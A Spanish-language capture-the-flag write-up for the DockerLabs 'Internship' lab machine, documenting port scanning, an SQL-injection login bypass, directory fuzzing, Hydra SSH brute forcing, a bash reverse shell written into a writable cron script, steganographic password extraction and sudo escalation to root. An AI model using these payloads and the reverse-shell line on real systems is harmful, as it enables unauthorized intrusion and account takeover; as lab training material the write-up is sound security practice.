---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Internship DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip internship.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh internship.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 11:47 EST
Nmap scan report for 172.17.0.2
Host is up (0.000046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 35:ff:c4:8b:c4:e1:46:12:43:b9:03:a9:cf:ec:f3:0a (ECDSA)
|_  256 23:ac:95:1e:be:33:9e:ed:14:f0:45:f6:27:51:ca:ba (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: GateKeeper HR | Tu Portal de Recursos Humanos
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
```

Vemos una pagina normal, pero los botones ni nada, funciona, por lo que vamos a inspeccionar el codigo y veremos lo siguiente:

```html
<link rel="dns-prefetch" href="//gatekeeperhr.com" />
```

Vemos lo que parece ser un `dominio` el cual vamos a poner en nuestro archivo `hosts` a ver si asi los botones van bien.

```shell
cat /etc/hosts
```

Info:

```
<IP>        gatekeeperhr.com
```

Lo guardamos y ahora pondremos lo siguiente en la `URL`:

```
URL = http://gatekeeperhr.com
```

Veremos que volvemos a la misma pagina, pero si le damos al boton de `login` veremos que funcion y veremos un panel de `login`.

Si probamos a realizar un `SQL Injection` simple, veremos que `Bypasseamos` el `login` y nos autenticamos:

```
User: ' OR 1=1-- -
Pass: ' OR 1=1-- -
```

Y veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (184) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que vamos a probar a ver si podemos sacar info de la base de datos con el `SQL Injection`, pero no podremos realizar mucho, si hacemos un poco de `fuzzing` ahora con el dominio.

## Gobuster

```shell
gobuster dir -u http://gatekeeperhr.com/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://gatekeeperhr.com/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.html       (Status: 403) [Size: 281]
/.htaccess            (Status: 403) [Size: 281]
/.htpasswd.php        (Status: 403) [Size: 281]
/.htpasswd.html       (Status: 403) [Size: 281]
/.htaccess.txt        (Status: 403) [Size: 281]
/.htaccess.php        (Status: 403) [Size: 281]
/about.html           (Status: 200) [Size: 3339]
/.htpasswd.txt        (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 281]
/contact.html         (Status: 200) [Size: 3140]
/css                  (Status: 403) [Size: 281]
/default              (Status: 200) [Size: 3861]
/includes             (Status: 403) [Size: 281]
/index.html           (Status: 200) [Size: 3971]
/js                   (Status: 403) [Size: 281]
/lab                  (Status: 403) [Size: 281]
/server-status        (Status: 403) [Size: 281]
/spam                 (Status: 200) [Size: 308]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que hay una carpeta llamada `/spam` bastante interesante, en la que si entramos, veremos una pantalla en negro, pero si inspeccionamos el codigo, veremos lo siguiente:

```html
<!-- Yn pbagenfrñn qr hab qr ybf cnfnagrf rf 'checy3' -->
```

Vemos que es una frase `codificada` en `ROT13`, y si lo decodificamos, veremos lo siguiente:

```
La contraseña de uno de los pasantes es 'purpl3'
```

Por lo que vemos hemos obtenido una `contraseña` y vemos que tenemos varios usuarios cuando entramos al panel de `admin`, por lo que nos crearemos un listado de usuarios con esos nombres:

Pero si inspeccionamos la pagina nos confirma que tiene que ser con uno de esos:

```html
<!-- Quitar los permisos SSH a los pasantes, ya terminará el tiempo de pasantía -->
```

> users.txt

```
ana
carlos
maria
juan
laura
pedro
sofia
diego
valentina
alejandro
```

Ahora realizaremos un ataque de fuerza bruta por `SSH`.

## Escalate user pedro

### Hydra

```shell
hydra -L users.txt -p purpl3 ssh://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-13 12:18:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: pedro   password: purpl3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-13 12:18:57
```

Vemos que hemos obtenido las credenciales del usuario `pedro`, por lo que nos conectaremos por `SSH`.

### SSH

```shell
ssh pedro@<IP>
```

Metemos como contraseña `purpl3` y veremos que estamos dentro, por lo que leeremos la `flag` de usuario.

> fl4g.txt

```
                           _
                        _ooOoo_
                       o8888888o
                       88" . "88
                       (| -_- |)
                       O\  =  /O
                    ____/`---'\____
                  .'  \\|     |//  `.
                 /  \\|||  :  |||//  \
                /  _||||| -:- |||||_  \
                |   | \\\  -  /'| |   |
                | \_|  `\`---'//  |_/ |
                \  .-\__ `-. -'__/-.  /
              ___`. .'  /--.--\  `. .'___
           ."" '<  `.___\_<|>_/___.' _> \"".
          | | :  `- \`. ;`. _/; .'/ /  .' ; |
          \  \ `-.   \_\_`. _.'_/_/  -' _.' /
===========`-.`___`-.__\ \___  /__.-'_.'_.-'================
                        `=--=-'                    

                      ~ Sigue asi ~
```

## Escalate user valentina

Si inspeccionamos la carpeta `/opt` veremos el siguiente archivo:

```
total 12
drwxr-xr-x 1 root      root      4096 Feb 10 03:46 .
drwxr-xr-x 1 root      root      4096 Feb 13 16:47 ..
-rwxrw-rw- 1 valentina valentina   30 Feb  9 01:47 log_cleaner.sh
```

Vemos que el archivo es de `valentina`, pero podemos escribir dicho archivo y pensare que lo estara ejecutando cada `x` tiempo, por lo que borraremos el interior del codigo y pondremos lo siguiente:

```bash
#!/bin/bash

bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
```

Lo guardamos y nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y tendremos que esperar unos segundos, pasados unos segundos, si vamos a ver donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.60.128] from (UNKNOWN) [172.17.0.2] 38584
bash: cannot set terminal process group (2196): Inappropriate ioctl for device
bash: no job control in this shell
valentina@796c859a931f:~$ whoami
whoami
valentina
```

Vemos que seremos el usuario `valentina`, por lo que ahora tendremos que sanitizar la shell.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Por lo que leeremos la flag del usuario.

> fl4g.txt

````
               ______
              '-._   ```"""---.._
           ,-----.:___           `\  ,;;;,
            '-.._     ```"""--.._  |,%%%%%%              _
            ,    '.              `\;;;;  -\      _    _.'/\
          .' `-.__ \            ,;;;;" .__{=====/_)==:_  ||
     ,===/        ```";,,,,,,,;;;;;'`-./.____,'/ /     '.\/
    '---/              ';;;;;;;;'      `--.._.' /
   ,===/                          '-.        `\/
  '---/                            ,'`.        |
     ;                        __.-'    \     ,'
jgs  \______,,.....------'''``          `---`


       ~ Ahora, a por la escalada de privilegios ~
````

## Escalate Privileges

Vemos que en la `home` de `valentina` hay una imagen llamada `profile_picture.jpeg` la cual nos tendremso que pasar al `host` para investigarla, pero veremos que nos tenemos `python`, ni ningun tipo de herramientas para pasarnoslo, por lo que haremos lo siguiente:

```shell
cp ~/profile_picture.jpeg /tmp
cd /tmp
chmod 777 profile_picture.jpeg
```

Ahora desde nuestro `host` ejecutamos lo siguiente:

```shell
scp pedro@<IP>:/tmp/profile_picture.jpeg .
```

Y con esto ya tendremos la imagen en nuestro `host` con las credenciales de `pedro`.

Vamos a probar si contuviera algun archivo oculto la imagen con la siguiente herramienta:

```shell
steghide extract -sf profile_picture.jpeg
```

Dejamos el `passphrase` en blanco y veremos que nos extrae el archivo.

Info:

```
Enter passphrase: 
wrote extracted data to "secret.txt".
```

Si leemos el archivo `secret.txt` veremos lo siguiente:

```
mag1ck
```

Vemos que hemos obtenido una palabra lo que parece ser una `contraseña` del usuario `valentina`.

Si realizamos `sudo -l` y metemos la contraseña, veremos lo siguiente:

```
Matching Defaults entries for valentina on 796c859a931f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty, listpw=always

User valentina may run the following commands on 796c859a931f:
    (ALL : ALL) PASSWD: ALL, NOPASSWD: /usr/bin/vim
```

Por lo que vemos podemos ejecutar lo que queramos como `root` y el binario `vim` igual, por lo que haremos lo siguiente:

```shell
sudo su
```

Info:

```
root@796c859a931f:/tmp# whoami
root
```

Y con esto ya seremos `root` por lo que leeremos la `flag` de `root`.

> fl4g.txt

````
 ,
     |\     ____
     \ \.-./ .-' T
      \ _  _( /| | |\
    ) | .)(./ |  |  |
      |   \(   \_|_/
  (   |     \    |
 )    |  \VvV    | (
      |  |\,,\   | 
    ) |  | ^^^   |    )
   (  |  |__     |   (
 )   /      `-. _|    )
(   /          /  `\
   /          ///_ |
  /jgs       (((-|'
              ```|

  _, _, ,  ,  _,  ,_  _  ___,_,
 /  / \,|\ | / _  |_)'|\' | (_,
'\_'\_/ |'\|'\_|`'| \ |-\ |  _)
   `'   '  `  _|  '  `'  `' '  
             '                 
Instagram: @purpl3_mag1ck
TikTok: @purple_mag1ck
````
